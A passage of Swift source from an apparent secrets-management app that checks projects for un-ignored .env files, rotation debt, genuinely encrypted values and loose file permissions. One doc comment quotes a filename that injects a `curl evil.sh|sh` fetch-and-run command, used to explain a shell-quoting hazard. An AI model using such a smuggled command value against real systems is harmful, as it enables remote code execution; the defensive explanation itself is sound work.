    /// produced the false OK; a named file with an honest "could not
    /// determine" is strictly more useful than a confident wrong answer.
    ///
    /// **Why the exposed-files branch offers no command.** It used to offer
    /// `echo '<name>' >> .gitignore`, built by wrapping the filename in a pair
    /// of single quotes. That was safe only while the candidate list was three
    /// hardcoded literals; the tree walk above made it "any filename in any
    /// repository the user cloned", and a file named `';curl evil.sh|sh;'.env`
    /// turns that string into three commands. `ShellQuoting` fixes the shell
    /// layer — but a `.gitignore` line needs a *second*, different escaping
    /// layer on top of it, because gitignore reads `*`, `?`, `[`, `]`, `!`,
    /// `#` and `\` as syntax, strips trailing spaces, and anchors any pattern
    /// containing a slash. A generated one-liner correct in both layers at
    /// once is unreadable, and an unreadable command is an unauditable one —
    /// which is the whole reason PROPOSAL.md §6 hands the user a string
    /// instead of running it. Worse, a line that is shell-correct and
    /// gitignore-wrong *appears* to work while ignoring nothing, which is this
    /// branch's own failure mode all over again.
    ///
    /// So the exposed-files branch names the files and says what to do with
    /// them, and warns when a name contains gitignore syntax. PROPOSAL.md §6
    /// already lists "adding a line to `.gitignore`" among the actions inside
    /// the app's own domain that it may perform directly; when that ships, it
    /// replaces this explanation with a button, not with a better one-liner.
    ///
    /// The `.undetermined` branch keeps its command. `git check-ignore` takes
    /// a path, not a pattern — there is only the shell layer to get right, and
    /// `ShellQuoting` plus a `--` separator gets it right for every filename
    /// that can appear on one line.
    ///
    /// **Scope.** This finding is produced from the same single walk
    /// `recipientFinding` uses, and it inherits that walk's limits: the
    /// directory-name exclusion list, and the file budget. Both are stated in
    /// the detail, on every branch, via `scanScopeSentence` — the walk is
    /// never the whole tree, and "found none" is a verdict about a scope, so
    /// the scope has to be on the page next to it. Reproduced before this
    /// existed: this app scanning its own repository skipped `.build` and
    /// `.swiftpm`, never came near the budget, and reported "Looked through
    /// <root> … and found none" naming no exclusion at all.
    private func gitignoreFinding(for project: InspectedProject, idScope: String, root: URL,
                                  tree: ScannedTree, scope: ProjectScopeAccountant,
                                  gitPath: String?) -> ScopedFinding {
        let findingID = "project.\(idScope).gitignore"
        let title = "\(project.name): plaintext files"
        let candidates = tree.plaintextCandidates

        let rootPrefix = Self.canonicalPath(root.path) + "/"
        func relativeName(_ url: URL) -> String {
            // `ofLeaf`, not `of`: a `.env` reachable through a symbolic link
            // must be named by the link inside the project, not by the target
            // outside it. See `CanonicalPath.ofLeaf`.
            let path = CanonicalPath.ofLeaf(url.path)
            return path.hasPrefix(rootPrefix) ? String(path.dropFirst(rootPrefix.count)) : path
        }

        // No candidate file at all is a definite answer that needs no git —
        // but only about the part of the tree the walk actually entered. A
        // walk that ran out of budget cannot say "found none" at all: it does
        // not know which files it never reached, so there is no scope left to
        // be right about. That is the budget route PROPOSAL.md §6 D describes
        // ("degrading to *Unknown* and naming what it did not reach"), applied
        // to this finding as it already was to `recipientFinding`. The
        // exclusion is handled differently and deliberately — it is named, not
        // demoted; see `scanScopeSentence`.
        guard !candidates.isEmpty else {
            guard !tree.wasTruncated else {
                return scope.finding(
                about: .theWholeTree,
                    id: findingID, title: title,
                    status: .unknown(reason: "This project has more files than this app's scan budget, so part of the tree was never searched for plaintext secret files."),
                    detail: "No plaintext files whose names conventionally hold secrets (.env and its variants) turned up in the part of \(project.rootPath) this scan reached — but it did not reach all of it, so this app is not telling you there are none.")
            }
            return scope.finding(
                about: .theWholeTree,
                id: findingID, title: title, status: .ok,
                detail: "Looked through \(project.rootPath) for plaintext files whose names conventionally hold secrets (.env and its variants) and found none.")
        }

        let names = candidates.map(relativeName).sorted()

        switch GitIgnoreOracle.classify(candidates: candidates, root: root, gitPath: gitPath) {
        case .undetermined(let reason):
            // `--` before the paths: a file called `-v.env` is an option to
            // every CLI ever written, and quoting does not change that.
            let command = ShellQuoting.singleQuotedList(names).map { "git check-ignore -v -- " + $0 }
            let explanation = command != nil
                ? "Check them yourself with the command below, and make sure anything holding a real secret is either ignored or moved into a file this app encrypts."
                : "Check them yourself with `git check-ignore -v`, and make sure anything holding a real secret is either ignored or moved into a file this app encrypts. \(Self.newlineInNameNote)"
            return scope.finding(
                about: .theWholeTree,
                id: findingID, title: title, status: .unknown(reason: reason),
                detail: "These files under \(project.rootPath) have names that conventionally hold plaintext secrets: \(names.joined(separator: ", ")). Whether they are ignored could not be established, so this app is not telling you either way.",
                remediation: Remediation(explanation: explanation, command: command))

        case .answered(let exposed, let tracked):
            guard !exposed.isEmpty else {
                let count = candidates.count == 1
                    ? "1 plaintext file whose name conventionally holds secrets"
                    : "\(candidates.count) plaintext files whose names conventionally hold secrets"
                // "git ignores all of them" is true of the files that were
                // found; over a truncated walk it is not an answer about the
                // project, for the same reason the empty-candidate branch
                // above is not.
                guard !tree.wasTruncated else {
                    return scope.finding(
                about: .theWholeTree,
                        id: findingID, title: title,
                        status: .unknown(reason: "This project has more files than this app's scan budget, so part of the tree was never searched for plaintext secret files."),
                        detail: "Found \(count) in the part of \(project.rootPath) this scan reached (\(names.joined(separator: ", "))), and git ignores every one of those. The scan did not reach the whole project, so this app is not telling you that is all of them.")
                }
                return scope.finding(
                about: .theWholeTree,
                    id: findingID, title: title, status: .ok,
                    detail: "Found \(count) under \(project.rootPath) (\(names.joined(separator: ", "))). git ignores all of them, so none can be committed by accident.")
            }

            let exposedNames = exposed.map(relativeName).sorted()
            let trackedNames = exposed.filter { tracked.contains($0.path) }.map(relativeName).sorted()

            // Ticket #3, claim 3: the debt this records must outlive the
            // condition that discovered it. `git rm --cached` on one of
            // these later makes `trackedNames` empty on the next run — this
            // finding would stop mentioning it — but the secret was already
            // in the repository's history the moment this ran, and nothing
            // about removing the file from the index changes that. So the
            // record goes to the ledger now, once, and stays until a user
            // acknowledges it — see `RotationDebtSource`'s doc comment.
            for name in trackedNames {
                rotationDebt.record(path: name, reason: .plaintextCommitted, in: root)
            }

            var detail = "These plaintext files under \(project.rootPath) are not gitignored: \(exposedNames.joined(separator: ", ")). Committing one publishes its contents to everyone with access to the repository's history, permanently."
            if !trackedNames.isEmpty {
                detail += "\n\nAlready tracked by git, so they are in the repository now: \(trackedNames.joined(separator: ", ")). Adding a .gitignore line does not remove a file that is already tracked."
            }

            let rotationNote = trackedNames.isEmpty
                ? " If one has already been committed, rotating the values is the only real fix — removing the file from a future commit does not remove it from history."
                : " For the files already tracked, rotating the values is the only real fix: they are in the history, and neither a .gitignore line nor a future deletion removes them from it. `git rm --cached <file>` stops tracking it going forward."

            var explanation = "Add these to .gitignore, one line per file — \(exposedNames.joined(separator: ", ")) — then move their secrets into a file this app encrypts."
            if exposedNames.contains(where: Self.nameNeedsGitignoreEscaping) {
                explanation += " One of those names contains a character .gitignore reads as pattern syntax (*, ?, [, ], !, # or \\), so it has to be escaped with a backslash in the line you add. `git check-ignore -v -- <file>` afterwards tells you whether the line actually took effect."
            }
            if exposedNames.contains(where: Self.nameSpansLines) {
                explanation += " \(Self.newlineInNameNote)"
            }
            explanation += rotationNote

            return scope.finding(
                about: .theWholeTree,
                id: findingID, title: title, status: .problem,
                detail: detail,
                // No command. See this method's doc comment: a `.gitignore`
                // line needs pattern escaping as well as shell escaping, and a
                // string correct in both is one nobody can read before running.
                remediation: Remediation(explanation: explanation, command: nil))
        }
    }

    /// Ticket #3: the durable half of the rotation-debt problem. Every place
    /// in this app that removes a recipient (`RecipientAccessModel.apply`,
    /// `ProjectAccessModel.applyToFiles`) or finds a plaintext secret
    /// already tracked by git (`gitignoreFinding`, above) records the fact
    /// through `rotationDebt`. This finding is the only place that fact is
    /// ever surfaced back to the user, and it reads the ledger directly
    /// rather than re-deriving anything from the current scan — that is the
    /// whole point: the condition that first revealed the debt (a stale
    /// recipient set, a tracked plaintext file) is allowed to clear without
    /// the debt clearing with it.
    ///
    /// There is deliberately no path from here back to `.ok` other than a
    /// user acknowledging each entry (`RotationDebtSource`/
    /// `SopsProjects.RotationDebtLedger.acknowledge`) — this app cannot see
    /// whether a value was actually rotated, only that removing it from the
    /// ledger is what a user who says it happened does. The remediation
    /// text below says exactly that, and never "verified" or "confirmed".
    private func rotationDebtFinding(
        for project: InspectedProject, idScope: String, root: URL, scope: ProjectScopeAccountant
    ) -> ScopedFinding {
        let findingID = "project.\(idScope).rotation-debt"
        let title = "\(project.name): rotation debt"
        let entries = rotationDebt.rotationDebt(in: root).sorted {
            ($0.path, $0.recordedAt) < ($1.path, $1.recordedAt)
        }

        guard !entries.isEmpty else {
            return scope.finding(
                about: .theWholeTree,
                id: findingID, title: title, status: .ok,
                detail: "No file in \(project.rootPath) has a recorded rotation debt.")
        }

        let formatter = ISO8601DateFormatter()
        let lines = entries.map { entry in
            "\(entry.path) — \(RotationDebtDescription.sentence(for: entry)) Recorded \(formatter.string(from: entry.recordedAt))."
        }
        let detail = "This app recorded that the following owe a rotation of their secret values, and nothing since has told it otherwise:\n"
            + lines.joined(separator: "\n")

        return scope.finding(
            about: .theWholeTree,
            id: findingID, title: title, status: .problem,
            detail: detail,
            remediation: Remediation(
                explanation: "This app cannot verify that a value was actually rotated — only you know that. Once you have changed the affected values at wherever issued them, mark each entry as settled from this file's Access panel. Until then this app keeps reminding you, even after the condition that first found it (a stale recipient, a tracked plaintext file) is gone."))
    }

    /// The whole file this app reads in full for `unencryptedLeavesFinding`
    /// — 8 MiB, the same budget `ProjectScanner.maxEscalatedSniffBytes`
    /// already spends on the rare file whose metadata sits further back
    /// than the ordinary tail read reaches. Deliberately the same number
    /// rather than a new one: this check's cost is already bounded by
    /// `tree.encrypted`'s own size (which `ProjectScanner.maxScannedFiles`
    /// bounds), so per file the only new cost is one more full read for
    /// files under this cap — no worse an order of magnitude than the tail
    /// read every one of them already paid, and files over the cap are
    /// reported unverifiable rather than read at all. See this check's own
    /// doc comment for why decrypting is never on the table here at any
    /// size — this only ever parses, and only files this small.
    static let maxLeafEncryptionCheckBytes = 8 * 1024 * 1024

    /// Ticket #5, claim 1: whether an encrypted file's *values* are
    /// actually ciphertext, which `recipientFinding` never asks — it only
    /// compares recipient *sets*, so a file whose `encrypted_regex` never
    /// compiled (sops discards that error and writes every value in
    /// cleartext behind a complete, valid metadata block — reproduced
    /// against the real CLI in `Engine/gobridge/leafencryption_test.go`)
    /// passes that check silently. This is the only place that looks at the
    /// leaves themselves.
    ///
    /// # What this is certain about
    ///
    /// `SopsBridge.inspectLeafEncryption` reports two facts about a file's
    /// own metadata alongside the leaf counts — see `LeafEncryptionSummary`
    /// (Swift) / `gobridge.LeafEncryptionSummary` (Go, the fuller account)
    /// for the reasoning — and this method turns them into exactly two
    /// certain shapes:
    ///
    /// 1. `uncompilableRuleDeclared`: the file's own metadata names a
    ///    regex-shaped rule that does not compile under the same engine
    ///    sops itself compiles it with. This is the ticket's own
    ///    reproduction — `encrypted_regex: (unclosed` — and it is certain
    ///    regardless of `narrowingDeclared`, because an uncompilable
    ///    pattern can never match anything: sops's fallback is not a
    ///    guess, it is what was measured.
    /// 2. `!narrowingDeclared && encryptedLeafCount < leafCount`: no rule
    ///    of any kind is declared, so sops's documented behaviour is to
    ///    encrypt every leaf — any gap here is the file failing to be what
    ///    its own metadata claims, not a design choice this app could be
    ///    second-guessing.
    ///
    /// # What this deliberately does not claim
    ///
    /// `narrowingDeclared && !uncompilableRuleDeclared`, with a gap: this
    /// app cannot tell "compiles and matches nothing in this document"
    /// (a legitimate, if unusual, configuration — see
    /// `TestEncryptAcceptsARuleThatMatchesSomeKeys` on the Go side) apart
    /// from a rule that was simply written for other files in the project,
    /// so this is reported unverifiable rather than guessed at. A wrong
    /// `.problem` here is exactly the expensive false positive this whole
    /// ticket warns against. A file larger than `maxLeafEncryptionCheckBytes`
    /// is unverifiable for cost, not correctness — see that constant's doc
    /// comment. Neither case is reported as `.ok`; both land in the same
    /// "not checked" bucket `recipientFinding` already uses for its own
    /// unreadable backends, and block an affirmative `.ok` the same way.
    ///
    /// # Ticket #5, claim 3
    ///
    /// `exposureledger.go`'s own doc comment says a comment losing MAC
    /// protection is invisible both to this app's leaf walk and to sops's
    /// integrity check — this app only guards against writing one itself
    /// (`refuseUnusableEncryptionRule`'s sibling for the exposure ledger),
    /// never against one that already exists. The scope for this ticket is
    /// "at least name it", so a standing caveat is appended to this
    /// finding's detail whenever there is at least one file to say it
    /// about — never a per-comment detector, which would need exactly the
    /// kind of arbitrary-YAML text scanning this codebase moved away from
    /// for `.sops.yaml` after three rounds of silent-corruption bugs (see
    /// this file's own type-level doc comment).
    private func unencryptedLeavesFinding(
        for project: InspectedProject, idScope: String, root: URL, tree: ScannedTree,
        scope: ProjectScopeAccountant
    ) -> ScopedFinding {
        let findingID = "project.\(idScope).encryption"
        let title = "\(project.name): encryption"

        let rootPrefix = Self.canonicalPath(root.path) + "/"
        func relativeName(_ url: URL) -> String {
            let path = CanonicalPath.ofLeaf(url.path)
            return path.hasPrefix(rootPrefix) ? String(path.dropFirst(rootPrefix.count)) : path
        }

        guard !tree.encrypted.isEmpty || !tree.encryptedInOtherFormats.isEmpty else {
            guard !tree.wasTruncated else {
                return scope.finding(
                    about: .theWholeTree, id: findingID, title: title,
                    status: .unknown(reason: "This project has more files than this app's scan budget, so part of the tree was never searched for encrypted files."),
                    detail: "No sops-encrypted files turned up in the part of \(project.rootPath) this scan reached — but it did not reach all of it, so this app is not telling you there are none.")
            }
            return scope.finding(
                about: .theWholeTree, id: findingID, title: title,
                status: .skipped(reason: "No sops-encrypted files were found under \(project.rootPath)."),
                detail: "There are no encrypted files yet, so there is nothing to check for genuine encryption.")
        }

        var problems: [String] = []
        var unverifiable: [String] = []
        var verifiedCount = 0

        for url in tree.encryptedInOtherFormats {
            unverifiable.append("\(relativeName(url)) is sops-encrypted in a format this app does not read yet — this build handles YAML only — so its values were not checked.")
        }

        for sniffed in tree.encrypted {
            let relative = relativeName(sniffed.url)

            guard let size = try? FileManager.default.attributesOfItem(atPath: sniffed.url.path)[.size] as? Int,
                  size <= Self.maxLeafEncryptionCheckBytes else {
                unverifiable.append("\(relative) is larger than this app is willing to read in full to check this, so its values were not checked.")
                continue
            }

            guard let contents = try? String(contentsOf: sniffed.url, encoding: .utf8),
                  contents.crossesCBoundaryIntact else {
                unverifiable.append("\(relative) could not be read to check whether its values are genuinely encrypted.")
                continue
            }

            do {
                let summary = try SopsBridge.inspectLeafEncryption(in: contents)
                let unencrypted = summary.leafCount - summary.encryptedLeafCount
                if summary.uncompilableRuleDeclared, unencrypted > 0 {
                    problems.append("\(relative)'s own metadata names an encryption rule that does not compile, and \(unencrypted) of its \(summary.leafCount) value(s) are not actually encrypted. sops discards a rule that cannot compile instead of refusing to save the file, so this file's valid recipient list and MAC describe the metadata, not the values.")
                } else if !summary.narrowingDeclared, unencrypted > 0 {
                    problems.append("\(relative) declares no rule narrowing which values it encrypts, but \(unencrypted) of its \(summary.leafCount) value(s) are not actually encrypted. This file's own metadata reports a valid recipient list and MAC — those describe the metadata, not the values, and a mismatch here is exactly what a file saved with a broken encryption rule looks like.")
                } else if summary.narrowingDeclared, unencrypted > 0 {
                    unverifiable.append("\(relative)'s own metadata narrows which values it encrypts (an encrypted_regex or similar rule that does compile), so an unencrypted value in it may be by design — this app did not check.")
                } else {
                    verifiedCount += 1
                }
            } catch {
                unverifiable.append("\(relative): could not determine whether its values are genuinely encrypted (\(error)).")
            }
        }

        let commentNote = " Separately: sops protects a comment's contents but does not include comments in its integrity check, so a comment cannot be verified as untampered by this app or by sops itself — never put a secret value in one."

        if !problems.isEmpty {
            var detail = problems.joined(separator: "\n")
            if !unverifiable.isEmpty {
                detail += "\n\nThis app also could not fully check:\n" + unverifiable.joined(separator: "\n")
            }
            return scope.finding(
                about: .theWholeTree, id: findingID, title: title, status: .problem,
                detail: detail + commentNote,
                remediation: Remediation(
                    explanation: "This file was very likely not saved by this app — it refuses to write an encryption rule that cannot compile. Re-encrypt it (with a working encryption rule, or none) using the sops CLI or by re-saving it here, then re-run this check. Because the old file was never actually protected, also rotate any secret values it held."))
        }

        guard unverifiable.isEmpty, !tree.wasTruncated else {
            let verified = verifiedCount == 0
                ? "No encrypted file's values could be checked here, so this app is not vouching for this project's encryption either way."
                : verifiedCount == 1
                    ? "Checked 1 encrypted file — its values are genuinely encrypted."
                    : "Checked \(verifiedCount) encrypted files — their values are genuinely encrypted."
            var detail = verified
            if tree.wasTruncated {
                detail += "\n\nThis project has more files than this app's scan budget, so part of the tree was never checked."
            }
            if !unverifiable.isEmpty {
                detail += "\n\nDeliberately not checked:\n" + unverifiable.map { "• " + $0 }.joined(separator: "\n")
            }
            return scope.finding(
                about: .theWholeTree, id: findingID, title: title,
                status: .unknown(reason: tree.wasTruncated
                    ? "This project has more files than this app's scan budget, so part of the tree was never checked."
                    : "Part of this project's encryption could not be checked. This is not a verdict on it."),
                detail: detail + commentNote)
        }

        let checked = verifiedCount == 1
            ? "Checked 1 encrypted file — its values are genuinely encrypted, not just its metadata."
            : "Checked \(verifiedCount) encrypted files — their values are genuinely encrypted, not just their metadata."
        return scope.finding(
            about: .theWholeTree, id: findingID, title: title, status: .ok,
            detail: checked + commentNote)
    }

    /// Characters `.gitignore` reads as syntax rather than as part of a name.
    /// A line built from such a name without backslash escaping matches
    /// something other than the file the user was told it covers — and a
    /// gitignore line that silently ignores nothing is precisely the failure
    /// this whole finding exists to catch.
    static func nameNeedsGitignoreEscaping(_ name: String) -> Bool {
        name.contains(where: { "*?[]!#\\".contains($0) })
            || name.hasPrefix(" ") || name.hasSuffix(" ")
    }

    /// Whether a filename contains a line break, and so cannot be named by
    /// any single-line command this app offers.
    ///
    /// `Character.isNewline`, not `$0 == "\n" || $0 == "\r"`: a CRLF pair is
    /// one `Character` equal to neither, so the explicit comparison missed
    /// exactly the name it needed to catch and the note about renaming the
    /// file first was never attached. Same fix, same reason, as
    /// `ShellQuoting.singleQuoted` — and the two must agree, because this
    /// predicate is what explains the `nil` that one returns.
    static func nameSpansLines(_ name: String) -> Bool {
        name.contains(where: \.isNewline)
    }

    static let newlineInNameNote =
        "One of these filenames contains a line break, which .gitignore cannot express and no single-line command can name safely, so this app is not offering one — rename the file first."

    /// Reports any encrypted file whose POSIX mode grants read or write to
    /// anyone besides its owner — `0644`, `0664`, `0666`, and so on.
    ///
    /// Nothing else in this app ever looks at a secret file's mode.
    /// `AtomicFileWriter.write` deliberately preserves whatever mode an
    /// *existing* file already has (see that type's own doc comment) — a new
    /// file this app creates gets `0600`, but a file that arrived on this
    /// machine some other way (`git clone` under a permissive umask, `cp`
    /// from a USB drive, a tarball extracted with `tar xf`) keeps whatever
    /// mode it arrived with through every save this app makes to it,
    /// silently. Encryption protects the *content* from anyone who cannot
    /// decrypt it; it does not stop a `chmod 644`'d file from telling every
    /// other account on the machine who this project encrypts to, when the
    /// file was last touched, and how large the secret set is — none of
    /// which needs a key to read.
    ///
    /// `stat`, not `lstat`: a symlink's own mode is not meaningful here — on
    /// macOS a symlink always reports as `lrwxrwxrwx` regardless of what it
    /// points at — so this asks about the mode of whatever file the link
    /// resolves to, the one whose bytes are actually the ciphertext.
    /// `EncryptedFileMetadata` and `SniffedFile.url` name the file this app
    /// would report a finding about (the link, inside the project); this
    /// only borrows `stat`'s symlink-following for the one number that has
    /// to come from the *target*.
    ///
    /// Both `tree.encrypted` and `tree.encryptedInOtherFormats`: a mode
    /// problem has nothing to do with which serialization the bridge can
    /// parse, so a sops-encrypted `.env` this app cannot read the recipients
    /// of is exactly as worth reporting here as one it can.
    private func filePermissionsFinding(
        for project: InspectedProject, idScope: String, root: URL,
        tree: ScannedTree, scope: ProjectScopeAccountant
    ) -> ScopedFinding {
        let findingID = "project.\(idScope).file-permissions"
        let title = "\(project.name): file permissions"

        let rootPrefix = Self.canonicalPath(root.path) + "/"
        func relativeName(_ url: URL) -> String {
            let path = CanonicalPath.ofLeaf(url.path)
            return path.hasPrefix(rootPrefix) ? String(path.dropFirst(rootPrefix.count)) : path
        }

        let candidates = tree.encrypted.map(\.url) + tree.encryptedInOtherFormats
        var loose: [(name: String, mode: mode_t)] = []
        for url in candidates {
            var info = stat()
            guard stat(url.path, &info) == 0, (info.st_mode & S_IFMT) == S_IFREG else {
                // Vanished between the walk and this check, or resolves to
                // something that is not a regular file (a dangling link,
                // for instance) — not this finding's question to answer.
                continue
            }
            let mode = info.st_mode & 0o777
            guard mode & 0o077 != 0 else { continue }
            loose.append((relativeName(url), mode))
        }

        guard !loose.isEmpty else {
            return scope.finding(
                about: .theWholeTree, id: findingID, title: title, status: .ok,
                detail: "Every encrypted file under \(project.rootPath) is readable and writable only by its owner.")
        }

        let sorted = loose.sorted { $0.name < $1.name }
        let names = sorted.map { "\($0.name) (mode \(String($0.mode, radix: 8)))" }
        let command = AgeKeyFileLocations.protectCommand(for: sorted.map { root.appendingPathComponent($0.name).path })

        return scope.finding(
            about: .theWholeTree, id: findingID, title: title, status: .warning,
            detail: "These encrypted files under \(project.rootPath) are readable or writable by more than their owner: \(names.joined(separator: ", ")). Encryption still protects the contents, but a loose mode lets every other account on this machine see who the file is encrypted to, its size, and when it last changed.",
            remediation: Remediation(
                explanation: "Narrow the file's permissions so only you can read or write it.",
                command: command))
    }
}
